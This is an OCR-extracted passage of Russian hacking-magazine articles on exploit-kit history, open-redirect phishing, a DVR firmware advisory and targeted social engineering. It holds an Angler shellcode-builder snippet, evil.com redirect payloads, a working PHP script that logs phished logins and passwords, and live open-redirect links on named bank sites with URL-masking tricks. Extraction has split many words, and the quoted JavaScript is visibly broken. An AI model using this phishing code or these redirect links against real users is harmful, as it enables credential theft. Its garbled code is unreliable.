типа CVE‐2010‐0188. Одна ко это не мешало ему быть эффективным.





                      Заражение «Стиксом»

С марта по май 2013 года Styx, по данным McAfee, заразил колоссальное
количество компьюте ров. Но почему тогда он затух уже к следующему году?
Дело в том, что Styx активно детектился топовыми антивирусами — «Каспер‐
ским» и NOD32.
  При этом в Styx была функция про верки на детекты, но не было встро‐
енной функции обфуска ции полезной нагрузки. Это можно было сделать
через официальный сайт. Одна ко стоимость в 3000 дол ларов не слишком
оправданна для такого сервиса. В итоге активность упала, а проект исчез.


FlashPack
Год появления: 2012
Пик популярности: 2013
Це на: информация утра чена
   FlashPack  по  не  извес тным  никому  причинам  ударил  точечно —
в основном по японским и американским компьютерам. В связи с чем япон‐
ские аналитики быстро выявили нес колько основных отличительных черт
в названиях запросов, которые подгружались при посещении зараженной
страницы. И несмотря на то, что в паке были топовые CVE‐2014‐0497, CVE‐
2014‐0515 и CVE‐2014‐0569, по большому счету на рынке он так и не загорел‐
ся. В 2014 году FlashPack занимал всего 4% среди инициаторов зараже ния
компьютеров в мире.


Magnitude
Год появления: 2013
Пик популярности: 2013
Це на: информация утра чена
   Вкратце можно упомянуть Magnitude. Несмотря на то что в него входили
не слишком свежие для сво его года эксплоиты (а именно CVE‐2011/CVE‐
2012), он имел крайне интересный механизм обфускации: Magnitude соз‐
давал имена поддомена каждые пять минут. К тому же он брал количес твом
эксплоитов — только для Flash их было около шестнадцати.
  Пробив был, таким обра зом, высоким и доходил до 20%. Также пак умел
фильтровать трафик от стран, поддержи вающих экс традицию прес тупников
в Россию. Однако система оплаты была откровенно мутной, пак сливал часть
трафика создателям, а это не слишком приветству ется на рынке киберпрес‐
тупников.


Neutrino
Год появления: 2013
Пик популярности: 2013–2016
Це на: 450 долларов в месяц
  Примерно в то же время появился Neutrino — ничем не примечательный
эксплоит‐кит с небольшим количеством экс пло итов, однако  актуальных,
а именно CVE‐2012‐1723, CVE‐2013‐2551, CVE‐2013‐0431. В дальнейшем он
несколько  раз  эволюционировал  и  даже  занимал  высокие  позиции
по количеству зараженных компь ютеров, но не выдержал конкуренции.


Angler
Год появления: 2014
Пик популярности: 2014–2016
Це на: 500 долларов в месяц
  В 2014 году появились такие мастодонты, как Angler и поначалу подающий
слабые надежды RIG. До 2016 года они шли в атаку в компании с Nuclear. An‐
gler появился в конце 2014 года и уже в 2015 году, по данным отчета Trustwave
Global Security, занимал вто рое мес то по количес тву зараженных компьюте‐
ров (17%), конкурируя только с не сдающим позиции Nuclear.
   Старт у Angler был действитель но мощный. Уже в первой версии содер‐
жалась масса функций. Во‐первых, перед началом работы проверялось
наличие защитных механизмов, а именно знат ный список антивирусов, вир‐
туальные машины, Fiddler и прочие снифферы. После проверки Angler запус‐
кал процессы обфускации, которые были созданы с особым вниманием.
К примеру, эксплоиты к Flash Player кодировались при помощи Base64, шиф‐
ровались при помощи RC4, а содержимое тща тель но скры валось с помощью
ActionScript.





                             Схема

При этом сам код не изобиловал пустыми функци ями, как у паков раннего
поколения, а просто был довольно нагруженным и грамотно написанным.
Вот, к примеру, выдержка, результат которой в дальнейшем декодируется
шелл‐кодом для эксплуатации CVE‐2014‐6332.


function build_shellcode() {
    var payloadURL = 'http://' window.location. host ’/’;
    // Add path stored in landing page array
    payloadURL += debase64(window.getpageArrayl());
    // Payload decryption key
    var Wttqe = ’Du930BgkbfzGvmFF’;
    var VkSkgk = Math.floor(Math.random() * (6 ‐ 3) + 3);
    var dotDLL = '%2E%64%6C%6C',
        nullvar = '%00';
    if (payloadURL.length > 200) return null;
    while (payloadURL.length < 200) {
        payloadURL += unescape(nullvar);
    }
    if (Wttqe.length > 16) return null;
    while (Wttqe.length < 16) {
        Wttqe unescape(nullvar);
    }
    payloadURL += unescape(nullvar);
    Wttqe += unescape(nullvar);
    return unescape(shellcode_partl + encData(payloadURL) + shellc
ode_part2 + encData( Wttqe) + shellcode_part3 + '%u0000')
}

Angler регулярно чистили при попада нии в базы антивирус ных систем, что
помогло ему занять лидирующую позицию и не уходить с нее вплоть
до 2016 года.

Как работа ют экс пло ит‑киты
Принцип работы самих упаковок схож. Поначалу это были скрипты на PHP
или переадресация с зараженной страницы или спам‐рассылки на страницу,
организующую выпол нение экспло итов. Сейчас это чаще всего JavaScript.
Помимо этого, экспло ит‐киты внедряются при помощи старого доброго спу‐
финга DNS.
  В функции шелл‐кода входит ска чивание и запуск целевого вредоносного
ПО, которое задает сам рас простра нитель.
  Само собой, такой алго ритм работы повышает вред от эксплоитов в разы,
так как паки регулярно обновляются, а их коды обфусцируются. Более того, те
же продукты компании Adobe, которые находят ся под ударом практичес ки
с появления первых экспло ит‐китов, до сих пор в числе ведущих коллекций
уязвимостей.




                 ВНЕЗАПНЫЙ СПАД


К 2016 году произошел крупный спад активности эксплоит‐китов. Первым
это заметил аналитик Брэд Дункан из Palo Alto Network. Из действительно
крупных игроков остались только разработчики RIG, который не сдавал
позиции с момента появления (а это, на секундочку, 2013 год).
  Почему так произошло? Дело в том, что либо большинс тво эксплоит‐китов
попросту затухли из‐за плохой поддержки, либо за их создателями «уже
выехали», как было с раз работчиком BlackHole. Одна ко RIG вышел на рынок
в пик популярности форумов для скрип ткидди и до сегодняшнего дня имеет
крайне дружелюбную техподдержку.


           WARNING

                      Вся информация об эксплоит‐ките RIG и его акту‐
                        альности предоставлена исключительно в озна‐
                     комительных целях, не пытайтесь его исполь‐
                          зовать.



                    RIG. ЖИВЕЕ ВСЕХ ЖИВЫХ


На официальном сайте‐продажнике в Рос сии экс плоит‐кит RIG изначально
был заявлен как регулярно обновляемый. Среди прочих услуг перечислена
чистка и обфускация, а также чистка по требованию. Покупателям выдаются
чистые и сертифицированные домены, которые не находятся ни в одном
блек‐листе  и  не  вызывают  в  пользовательском  браузере  сообщений
о недоверенном сертификате.
  Цена (500 долларов за месяц) не изменилась с 2013 года по сей день,
однако обновления по‐прежнему выходят довольно регулярно (последнее
было в конце мая — добавили CVE‐2018‐8174). В 2015 году в Сеть утекали
исходники, которые, несмотря на отсутс твие самих экс плоитов, выглядели
достойно.
  После этого RIG выживал на рынке как мог, в том числе заимствуя
исходники  у  других  разработчиков.  Например,  у  Neutrino,  который
по популярности уже далек от RIG, была позаимствована модель исполь‐
зования определенных процес сов в системе. Также RIG перенял у Angler
методы обфускации.
  Еще в самом начале авто ры RIG ввели строгую политику по отношению
к работе с российским трафиком. Это помогло избежать внимания со сто‐
роны российских правоохранитель ных органов и положительно сказалось
на клиентуре. Заметим, одна ко, что RIG — это скорее дешевый и сердитый
вариант, так как в его работе немало погрешнос тей.
  После спада активнос ти прочих экс плоит‐китов дешевизна RIG привлекла
к нему распространителей  низкокачественного вре доносного ПО. Уже
в январе 2017 года, по данным ана литика Брэда Дункана, RIG при нял учас тие
в доставке множества троянов‐вымогателей в рамках 39 различных кам‐
паний.
  К середине прошлого года активность RIG поутихла, во многом в свя зи
с тем, что исходники утекли в Сеть и антивирусные компании разобрали обо‐
лочку RIG вдоль и поперек. Остальные паки к это му времени тоже уже ушли
с рынка.
  Однако RIG затаился только до того момента, когда низкокачественные
стиллеры, майнеры и клип перы стоимостью (без шуток) 500–1500 руб лей
перестали сами по себе приносить достойное количество жертв и логов
с того трафика, который до этого успешно впаривался малолетним кибер‐
преступникам на каждом теневом форуме.
   Благодаря RIG даже самые низкопроб ные стиллеры вроде Nocturnal Steal‐
er, имеющего кривой лог и неприлично низкую цену, получили своего покупа‐
теля и своих жертв.
  Именно тогда на передний план вышла дешевизна RIG, а также воз‐
можность распространять сразу два вредоноса одновременно. Это привело
к нему кардерское сообщес тво: появи лась пот ребность распространять
в довесок к стиллерам кейлоггеры или же связки из стил лера и ботнета
с HVNC.
   Благодаря поддержке, которая дает практически пошаговые инструкции,
и многочисленным мануалам по чистке пуб лично доступных стабов с целью
обфускации вре доносного ПО многие начина ющие киберпрес тупни ки вли‐
ваются в серьезные дела, несравнимые с угоном игровых аккаунтов и про‐
чими шалостями.
  Одновременно  RIG  строит  вокруг  себя  обширную  инфраструктуру
из дополнительных сервисов. Американские хостинги, как извес тно, часто
используются киберпреступниками по всему миру для размещения чистых
доменов для эксплоит‐китов.
  В России так называемые пуленепробиваемые хостинги тоже процветают,
делая огромные наценки на свои услуги. Обычно они ставят серверы в дру гой
стране, чтобы избе жать столкновения со спецслужбами РФ.
  Существует и немало мелких услуг вроде вскрытия полученных со стил‐
леров файлов wallet.dat — офлайновых кошельков с криптовалютами. Фак‐
тически это отдельная ветка киберпреступного рынка, которая обслуживает
владельцев стиллеров.



                 ПОСЛЕДСТВИЯ RIG


Все это привело к неприятным пос ледстви ям. Во‐первых, урон от даже
корявых криптолокеров и стиллеров просто немыс лим, причем как для жертв,
так и для распространителей (огромное количес тво молодых людей получили
вполне заслуженные сроки уже в этом году).
   Также стоит отметить новый всплеск упаковок для экс плоитов, таких
как Fallout или Underminer.
   Хотя они используют скудное количес тво экс пло итов, среди которых бук‐
вально один‐два за этот год, в нынешних усло виях у них есть все шансы
занять свое место. Тот же Fallout имеет два свежих CVE: 2018‐8174 и 2018‐
4878, причем непосредс твен но до загрузки вредоноса анализирует наличие
песочниц, виртуальных сред и лишь потом загружает ПО, тем самым сводя
к минимуму возможность попада ния кода под нож.
   Нельзя исключать, что это паки‐однодневки, которые просто на время
заняли рынок. Возможно,  экс плоит‐паки ждет еще более насыщенное
будущее, чем описанное здесь прошлое.
ВЗЛОМ

ЭКСПЛУАТИРУЕМ
OPEN REDIRECT





КАК
ОТКРЫТЫЙ
РЕДИРЕКТ
ИСПОЛЬЗУЮТ
ДЛЯ ФИШИНГА
И DDOS





        Айгуль C.
   Девушка‐гик, фриланс‐
       программист
   aigulforever@yandex.ru





Уязвимости типа Open Redirect позволяют перенаправить
пользователя на фишинговый сайт или заставить скачать
руткит под видом полезного ПО. Несмотря на всю опасность
этих уязвимос тей, закрывать их не спешат даже в Google.
Давай разберемся, почему так вышло и как работают разные
атаки с Open Redirect.


Редирект позволяет направить пользователя с одного сайта на другой —
это знают все. Что же тогда такое Open Redirect («откры тое перенаправле‐
ние»)? Звучит как название какого‐то свободного стандарта, но в реальности
так называют уязвимость, которая поз воляет незаметно направить поль‐
зователя на любой сайт с доверенного домена.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.


В основном этот баг использует ся для фишинга. Злоумышленник перенап‐
равляет с уязвимого доверенного сайта на свой фишинговый сайт и крадет
данные.  Эта  уязвимость  активно  при менялась  хакерами  при  атаках
на государственные сайты.
  Представь, что получится, если сайт apple.com станет разрешать редирект
на apple.evil.com. Поль зователь будет думать, что он находится на доверен‐
ном сайте, но при этом оставлять свои данные на сай те злоумышленника.
Кстати, подобную уязвимость уже находили.
  А что, если прямо сейчас в Google откры та такая уязвимость? Поль‐
зователь заходит на свою почту по ссылке google.com, вводит данные. Воз‐
можно, он проверяет адресную строку браузера и URL, но в ней все в поряд‐
ке. Затем попадает на страницу с пись мами и видит привычную ежедневную
картину. Как часто в этот момент пользователи проверяют адресную строку?
А ведь свирепые русские хакеры не дремлют!


РАЗБИРАЕМСЯ ГЛУБЖЕ В OPEN REDIRECT
К примеру, у нас есть доверенный сайт http://site.com/. Но в нем есть уяз‐
вимость Open Redirect, которая будет выглядеть так: http://site.com/lo‐
gin?redirectUrl=http://site.com/auth. Пос ле авторизации на странице
сайта пользователь перенаправляется на http://site.com/auth.
  Попробуем  заменить  http://site.com/auth  на  http://evil.com/.
Получится  ссылка  http://site.com/login?redirectUrl=http://evil.
com/. Если мы перейдем по этой ссылке после авторизации, а нас направля‐
ет на evil.com, значит, сайт имеет уязвимость Open Redirect.


Откуда появляется уяз вимость?
Администраторы сайтов обычно либо не зна ют о такой уяз вимос ти, либо
не сверяют URL перенаправления с раз решенным белым списком, сос‐
тавленным заранее. Уязвимый код на сервере будет выглядеть приб‐
лизительно так (пример на PHP):


<?php
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
?>

Тогда  уязвимая  ссылка  будет  такой:  http://site.com/example.php?
url=http://evil.com.
  А вот аналог на Java — здесь тоже серверное перенаправление.


public class RedirectServlet extends HttpServlet {
  protected void doGet(HttpServletRequest request, HttpServletResp
onse response) throws ServletException, IOException {
    String query = request.getQueryString();
    if (query.contains("url")) {
      String url = request.getParameter("url");
      response.sendRedirect(url);
    }
  }
}

Сервер получает запрос GET с парамет ром url и перенаправляет браузер
на адрес, переданный в URL.
   Что до перенаправления на стороне клиента, то оно может выглядеть
как‐то так:


<a href="http://bank.site.com/redirect?url=http://evil.com">Click
here to log in</a>

Пользователь думает, что ссылка безопасная, так как начинается с bank.site.‐
com. Однако после перехода он будет перенаправлен на похожий фишин‐
говый сайт.


Как самому найти уяз вимость?
 • Внимательно прой тись по всем ссылкам сайта и найти в них параметры
   перенаправления.
 • Как вариант, можно использовать перебор при помощи специальных
   программ.
 • Ввести в поисковую стро ку Google site:target.com inurl:redirec
  tUrl=http.
 • Проанализировать, где может использоваться перенаправление. К при‐
   меру, редирект после авто ризации.
 • Попробовать найти уяз вимость с помощью раз личных известных трюков:
  target.com/?redirect_url=https://evil.com,    target.com//
  evil.com. Другие трюки ты можешь посмотреть по ссылкам.


        WWW

                    •Random Robbie payloads
                      •EdOverﬂow CheatSheet
                       •Ak1t4 payloads
                         •Cujanovic payloads



ЭКСПЛУАТАЦИЯ УЯЗВИМОСТИ. ОСНОВНЫЕ УГРОЗЫ
Фишинг
Для атаки злоумышленник отправляет на почту пись мо со ссылкой http://
site.com/login?redirectUrl=http://evil.com/. Жертва видит доверен‐
ную ссылку и попадает по ней на стра ницу, идентичную оригинальному сайту.
Далее человек вводит логин и пароль, которые злоумышленник и сохраняет
с помощью скрипта.
  С помощью этой уяз вимос ти про изво дился фишинг сайта Visa. Также уяз‐
вимость использовалась для фишинга банковских аккаунтов. Люди перехо‐
дили по баннеру, в котором была уязвимая ссылка, и она отправляла их
на фишинговый сайт.





                    Баннер с уязвимой ссыл кой


Совмещение с дру гой уяз вимостью
Другой вариант атаки сводится к отправке человека на сайт, содержащий
эксплоит для браузера или CSRF. Также можно совместить Open Redirect
с XSS, как это было сделано исследователем с сай том google.com.
  Способы совмещения могут быть самыми разными. Нужно просто сидеть
и внимательно и упорно пробовать раз ные варианты.


Open Redirect для DDoS
На GitHub есть интерес ный скрипт, который использует откры тое перенап‐
равление для атак DDoS.





                           Скрипт UFONet

Автор описывает UFONet как ботнет для проведения Layer 7 DDoS атак (в
учебных целях, конечно же).





                 Визуализация «Зомби» на карте

В интерне те есть видео, где хакеры используют UFONet против реальных
сайтов. Можешь скачать и порез виться с ним на своем сайте. Но многого
ожидать от него не стоит! :)


$ ls ‐l
$ git clone https://github.com/epsylon/ufonet.git


ОТКРЫТАЯ УЯЗВИМОСТЬ В GOOGLE
В 2016 году исследователь об наружил уязвимость в Google. Она заключается
в том, что при переходе по ссылке с редиректом открывается обычная стра‐
ница авторизации в Google. Ссылка выглядит примерно так:


https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fappe
ngine.google.com%2F_ah%2Fconflogin%3Fcontinue%3Dhttps%3A%2F%2Fevil.
com%2F&service=ah





                       Авториза ция в Google

Открывшего ее перебросит на сайт evil.com/_ah/conflogin/. Как это мож‐
но использовать? Разработчики Google ответили исследователю, что Open
Redirect сам по себе не считает ся уязвимостью, и не стали закрывать эту
дыру. Но злоумышленники взя ли ее в оборот и активно используют. Рассмот‐
рим подробнее их методы атаки.


Доставка ссыл ки
При  точечной  атаке обычно идет пря мое  вза имодей ствие с жертвой:
под любым предлогом и любым способом ей передается уязвимая ссылка.
При массовой атаке зло умышленники рас сыла ют спам или размещают ссыл‐
ку на сайтах, где жертва не сможет усто ять и кликнет.
  Один из вариантов такого спа ма — ког да на почту (не Gmail) при ходит
письмо о том, что аккаунт свя зан с ящи ком Gmail. В теле письма предлага‐
ется войти в аккаунт под раз ными предлогами.





                   Фишинговое письмо


Методы атак
Фишинг аккаунта Google
Пользователь после перехода по ссылке в пись ме попадает на страницу
авторизации google.com. Там он вводит данные, но потом видит такое же
окно авторизации с сообщением об ошиб ке в данных (хотя данные введены
были верно). В чем тогда дело? Обычно человек думает, что опечатал ся
или ввел не тот пароль.





                  Фишинговая стра ница

В реальнос ти же он уже находится на сайте злоумышленника! Просто этот
сайт отображает фейковое окно, неотличимое от логина в Google.
  Данные, введенные в этом окне, будут отправлены скрипту на PHP,
который сохранит их на сервере зло умышленника.


<?php
if (empty($_POST["username"])) {
  exit();
} else {
  $result = array(
    'username' => $_POST["username"],
    'password' => $_POST["password"]
  );
  echo json_encode($result);
  $Login = $_POST['username'];
  $Pass = $_POST['password'];
  $log = fopen('accounts.php','a+');
  fwrite($log,"<br> $Login:$Pass \n");
  fclose($log);
}
?>

После нажатия на кнопку жертва перенаправляется на ее страницу с пись‐
мами, не подозревая, что она скомпро мети рована. Хакер по ту сторону
монитора радостно ухмыляется, увидев завет ные данные.


Зараже ние вирусом
Точно таким же способом жертву пос ле окна авторизации в google.com мож‐
но перенаправить на сайт с «обновлением» бра узера, где человека просят
скачать вирусный файл.





               Об новление бра узера с вирусом

После загрузки жертва перенаправляется на страницу с письмами и ничего
не  подозревает.  Есть  большой  шанс,  что  пользователь  пораду ется
«обновленному браузеру» и сам установит себе вирус.


Фишинг дру гих аккаунтов (PayPal, Amazon, Vkontakte и про чие)
После окна авторизации в google.com жертва попадает на страницу «своей»
почты. Однако все пос ледние пись ма — от определенного сайта, который
настойчиво просит вой ти в акка унт под любым предлогом.





                 Фишинг акка унтов PayPal

На самом деле это фейковая почта, муляж, в котором не работает ничего,
кроме открытия письма. В самом пись ме содержится ссылка на фишинговый
сайт с замаскированным доменом. К примеру, paypal.login‐com.com. Нев‐
нимательная жертва в шоке перехо дит по ней на сайт злоумышленника
и отдает ему свои данные.


ИТОГ
Уязвимость Open Redirect — ошибка разработчиков сайта, которая позволяет
злоумышленникам незаметно перенаправлять поль зователей куда угод но
и подсовывать им что угодно. Что бы ее избежать, необходимо как минимум
уведомлять пользователя о перенаправлении.
  Интернет кишит уязвимостями. Плохие русские (и не только рус ские)
хакеры не спят и зараба тывают, как могут, воруя чужие данные. В то время
как товарищи в белых шляпах получают свои тысячи долларов, находя подоб‐
ные уязвимости в программах Bug Bounty.
  В общем, будь начеку, проверяй URL в адресной строке, никуда не логинь‐
ся по ссылкам из поч ты и обращай внимание, если окно авторизации вдруг
возникло из ниоткуда или выглядит хоть сколько‐нибудь подозрительно. Пре‐
дупреди о такой возможности менее подкованных дру зей и родственников.
Ну а если хочешь изучить Open Redirect еще подробнее или прокачать свой
навык работы с ним, то рекомендуем полезные сайты по ссылкам ниже.


        WWW

                    •Находим Open Redirect с помощью Burp
                      •Тестирование уязвимости Open Redirect на сто‐
                        роне клиента. OWASP
                         •Wiki хакера по Open Redirect
                    •Подробнее об XSS
                      •Уязвимость на 1000 долларов в Facebook
ВЗЛОМ

   X-ИССЛЕДОВАНИЕ:
 NVR  DVR    И





       РАЗБИРАЕМ УЯЗВИМОСТИ
       В ВИДЕОРЕГИСТРАТОРАХ,
        КОТОРЫЕ ВСЕ НИКАК
           НЕ ПОФИКСЯТ





Ботнеты,  сос тоящие  из  уязвимых  IoT‐
устройств, —  суровая действительность
наших дней. Атакующие постоян но ищут
уязвимые хос ты, что бы усилить свою сеть.
И иногда так получается, что про изводите‐         Денис Макрушин                                                                                      Специализируется на
ли «умных» железок сво ей пассивностью         разработкеисследованиитехнологийугроз и
непреднамеренно   помога ют   зло деям       защиты#InspiredByInsecureот целевых атак.
реализовать их пла ны. Рассмотрим имен но          condifesa@gmail.com
такой случай.


           WARNING

                    Описанные в материале уяз вимости были сво‐
                       евременно  отправлены  вендору,  китайскому
                    CERT и Mitre. Все уязвимости получили номера
                      CVE. Мы публикуем дан ную информацию в соот‐
                        ветствии с общепринятой политикой разглашения
                         уязвимостей. Однако вен дор до сих пор не сооб‐
                      щил, как собирается зак рывать уязвимости, а в
                       зоне риска находится мно го устройств . Поэтому
                  мы не будем приводить подробные сведения
                      об уязвимом ПО и устройствах.


Сегодня мы в формате Security Advisory (отжа тые до самой сути отчеты
об обнаруженных уязвимостях, в таком формате их получают производители
уязвимого компонента, Mitre и CERT) рас скажем тебе о трех уяз вимос тях
в прошивках DVR/NVR (digital/network video recorders) крупного китайского
производителя,  который  раз рабатывает  прошивки  для  разнообразных
устройств (DVR, NVR и IP‐камеры).
   Рассмотренная версия прошивок работа ет на различных DVR/NVR‐
устройствах, которые  также про изво дятся в Китае и распространяются
по модели white label, когда на заводе устрой ство выпус кают без маркировки,
а затем вендоры выводят его на рынок под своим брендом. Я обнаружил
в открытом доступе более 120 тысяч устройств, артефакты которых (версия
и баннеры запущенных сервисов, фингерприн ты веб‐интерфейса и прочее)
указывают на то, что устройство работа ет под управлением данной прошивки
и, соответственно, может иметь описанные ниже уяз вимости.





           География распростра нен ности уязвимых устрой ств


ОБЪЕКТ ИССЛЕДОВАНИЯ
Как я упоминал, огромное количество устройств под управлением данной
прошивки распространяется по модели white label. На фотографии ниже при‐
мер подобного устрой ства. Оно и ста ло объектом исследования.





                Пример уяз вимого DVR‐устройства

Прошивка содержит «зашитые» учетные данные, которые могут быть исполь‐
зованы атакующим для привилегированного дос тупа к работающему устрой‐
ству и  кражи ценной информации, например  получения виде опотока,
или (классика жанра) для включения данного устройства в ботнет. Также уяз‐
вимый веб‐интерфейс позволяет ата кующему обойти процедуру  аутен‐
тификации и получить привилегированный дос туп к видеопотоку.
  В  последних  версиях  прошивки   (на  момент  иссле дования —
декабрь 2017 года) были обнаружены уязвимос ти:
 • обход аутентификации в веб‐приложении;
 • «зашитая» учетная запись для Telnet;
 • «зашитые» учетные записи для веб‐панели управления и RTSP‐сервера
   (Real Time Streaming Protocol).


ТЕХНИЧЕСКИЕ ДЕТАЛИ
Об ход аутен тификации в веб‑приложе нии
Веб‐панель, разработанная для управления устрой ством и виде омониторин‐
га, имеет «особен ность» (довольно рас пространенную среди подобных
устройств), которая позволяет неавторизованному пользовате лю получить
доступ к виде опотоку. Дос таточно изменить URL


http://<IP>/<main_page_with_login_form>.html

на что‐то подобное:


http://<IP>/<video_stream>.html

Эта уязвимость в веб‐приложении воз ника ет из‐за того, что отсутс твуют про‐
верки пользовательских прав, — судя по обновленному OWASP TOP 10 IoT
Vulnerabilities, это достаточно тривиальная проб лема.


           ОЦЕНКА УЯЗВИМОСТИ
                   CVSS v3
                      Base Score: 7.5
                           Vector: (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:M/A:N)



Зашитые учетные дан ные для Telnet
Файлы прошивки находят ся в открытом доступе и не защищены от анализа
содержимого. В результате любой желающий может распаковать образ про‐
шивки.  Это  один  из  способов,  который  используют  злоумышленни ки
для пополнения своих ботнетов. Злодеи непрерывно следят за обновле‐
ниями прошивок на сайте про изво дителя; они успешно распаковывают образ
прошивки и приступают к изу чению ее содержимого. Если распакованная
прошивка содержит «зашитые» учетные данные, зло умышленники включают
их в брут‐листы своего сканера.





  Благополучно распакованная прошивка. В недрах ее файловой системы
  содержатся «зашитые» учетные данные

В прошивке, которую мы анализирова ли, обнаружились учетные данные
для Telnet‐подключения. В файле etc/passwd есть следующая строка:


root:<Unix_md5_string>:0:0:root:/:/bin/sh

Эта строка содержит учет ные данные привилегиро ванного пользовате ля Tel‐
net, которые владелец устройства изменить не может.


           ОЦЕНКА УЯЗВИМОСТИ
                   CVSS v3
                      Base Score: 10
                           Vector: (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)


Зашитые учетные дан ные для веб‑сервера и RSTP-сервера
Используя описанную выше учетную запись для Telnet, атакующий может
получить доступ к следующим файлам, которые содержат все пользователь‐
ские учетки для веб‐панели и RSTP‐сервера:


<temporary_dir>/Config1
<temporary_dir>/Config2

Кроме того, эти файлы содержат «зашитые» учет ные данные (бэкдор):


<default_username>:<password_in_clear_text>





  Фрагмент файла, содержащего «зашитые» учетные данные
  для веб‐панели

В результате атакующий может получить дос туп к веб‐панели и виде опотоку.


           ОЦЕНКА УЯЗВИМОСТИ
                   CVSS v3
                      Base Score: 7.5
                           Vector: (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:M/A:N)



КАК УСТРАНИТЬ ОПИСАННЫЕ УЯЗВИМОСТИ
 1. Запретить любой дос туп к веб‐панели, используя белый спи сок доверен‐
   ных IP‐адресов.
 2. Скрыть работающее устройство за NAT роутера. Если это невозможно, то
   необходимо отключить от интернета (изолировать) уязвимое устройство.
 3. Если требуется получить дос туп к видеопотоку через интернет, то лучше
   использовать соединение с вендорским облаком (если устройство под‐
  держивает такую возможность).


Текущий ста тус отче та
 • 01.12.2017 — отчет передан производителю.
 • 11.01.2018 — производитель подтвердил, что отчет получен.
 • 14.06.2018 — отчет передан китайскому CERT (National Computer network
   Emergency Response technical Team / Coordination Center of China) и Mitre.
ВЗЛОМ





        Юрий Другач             НЕСТАНДАРТНЫЕ ТЕХНИКИ
       Автор блога о социальной
             инженерии            ВВЕДЕНИЯ В ЗАБЛУЖДЕНИЕ
 ЦЕЛЕНАПРАВЛЕННАЯ
      СОЦИАЛЬНАЯ
       ИНЖЕНЕРИЯ





В этой статье мы рассмотрим несколько техник социальной
инженерии, которые можно использовать таргетированно,
то есть в тех случаях, когда выбрана кон кретная жертва
(человек или компания). Считается, что таргетированные
атаки отнимают больше времени на подготовку. Из опыта я
знаю, что спровоцировать сде лать что‐то сотню случайных
человек легче, чем одного кон кретного в определенной
организации.


В предыдущей статье мы разоб рали мас совые ата ки, но их при менимость
ограничена. Например, они плохо под ходят для тестов на проникновение.
Пентестер не может позволить себе исходить из теории вероятностей и рас‐
сылать свои ловушки всем сотрудникам проверяемой организации в надеж‐
де, что кто‐то попадется. Один‐два бдительных пользователя оповестят служ‐
бу безопасности, и ата ке конец. Плюс нужна подготовка под конкретную
инфраструктуру и специфику заказ чика, а при емы социального инженера
должны быть нестандартными.


           WARNING

                        Статья предназначена для «белых хакеров», про‐
                    фессиональных  пен тесте ров  и  руководите лей
                       службы информацион ной безопасности (CISO).
                    Ни автор, ни редакция не несут ответственности
                        за любой возможный вред, причиненный матери‐
                       алами дан ной статьи.


«Белые шляпы», пентестеры и обла датели CEH обычно понимают, что их дей‐
ствия играют не только техническую, но и социальную роль. Я неслучайно
упомянул CISO, посколь ку их задача — постоянно обучать всех сотрудников
основам информационной безопасности. Если ценного спе циалиста уволь‐
няют из‐за того, что он открыл зараженный файл, то в этом есть и доля вины
нерадивых безопасников.
  Правила безопасности всегда пишут ся пос тфактум, а потому инертны
и слабо защищают от современных угроз. Банки уже давно не нужно грабить
в масках с автоматами — теперь дос таточно электронной почты, но во многих
финансовых организациях еще живы ста рые стереотипы. Акцент в них делают
на физическую безопасность, считая информационную менее существенной.
Достаточно вспомнить недавнюю историю с ограблением ПИР Банка и ком‐
ментарий его председателя правления: «…с наибольшей вероятностью вирус
проник в банк через фишинговое письмо».
  Давний парадокс оста ется актуальным: ИТ‐специалис ты не устают заяв‐
лять, что социальная инженерия — главное зло. При этом многие «безопас‐
ники» продолжают считать, что хитроумного софта и однажды написанных
инструкций для пер сонала дос таточно, чтобы противостоять киберугрозам.


ДОВЕРЕННЫЙ САЙТ КАК ПРОХОДНОЙ ДВОР
У вашего файрвола формально настроены «черные» и «белые» списки URL?
Тогда мы идем к вам! Вот несколько при меров, ког да на сайте банка исполь‐
зуется одна известная CMS с незакрытым редиректом:


https://avbbank.ru/bitrix/redirect.php?goto=http://plohoyavbbank.ru
http://www.rncb.ru/bitrix/redirect.php?goto=http://zloyrncb.ru
http://www.moscow‐bank.ru/bitrix/redirect.php?goto=http://
ne‐moscow‐bank.ru
http://kbivanovo.ru/bitrix/redirect.php?goto=http://hackkbivanovo.ru

Если файрвол смотрит только то, что идет после первого http(s), то пора его
подкрутить. Но эта статья не про нас тройку межсетевого экрана, а про
человеческие слабости. Поэто му просто дай сотруднику такую ссылку и про‐
верь, насколько он бдителен и смотрит ли он дальше первого встречающе‐
гося http(s).


ЧТО ЗА СОБАКА?
Данный способ не сработает с внимательными сотрудниками, но если бы все
были внимательны, то социальной инженерии не существовало бы как явле‐
ния. ;‐)
   Развивая предыдущий способ для тех, кто при вык смотреть, что идет сразу
после http://, и думать, что URL безопасен: данная ссыл ка https://bank.
ru@zloysite.ru тоже не приведет ни к чему хорошему.
  Почему так происходит? Допустимые в URL символы задокументированы
в стандарте RFC 1738. Символ @ использует ся в URL как специальный раз‐
делитель, когда нужно прямо в нем дать пра ва для дос тупа к странице.
В конструкции вида httр://<логин>:<пароль>@<хост> до @ можно ука‐
зывать практически что угодно. Браузер все равно отправит пользовате ля
на хост, указанный после @.


ЧТО ЗА АБРАКАДАБРА?
Добавим в зловредный URL немного кириллицы, закодированной в UTF‐8 →
HEX, чтобы он выглядел непонят но для человека и на первый взгляд безопас‐
но:


http://bank.ru@%D0%B7%D0%BB%D0%BE%D0%B9%D1%81%D0%B0%D0%B9%D1%82.
%D1%80%D1%84





                 Закодированный домен .рф в URL

Или совместим простые техники (редирект + кодирование):


http://www.moscow‐bank.ru/bitrix/redirect.php?goto=http://www.
moscow‐bank.ru@%D0%B7%D0%BB%D0%BE%D0%B9%D1%81%D0%B0%D0%B9%D1%82.
%D1%80%D1%84

При наведении мыши на закодированный URL десктопные браузеры декоди‐
руют символы (чего не ска жешь об Outlook и мобильных браузе рах). Поэтому
для полного скрытия  зло го адреса мож но прописать адрес сервера,
на котором расположен фишинговый сайт:


http://www.moscow‐bank.ru/bitrix/redirect.php?goto=http://www.
moscow‐bank.ru@178.248.232.27

или просто


http://www.moscow‐bank.ru@178.248.232.27





            Вместо домена в URL используем IP сервера

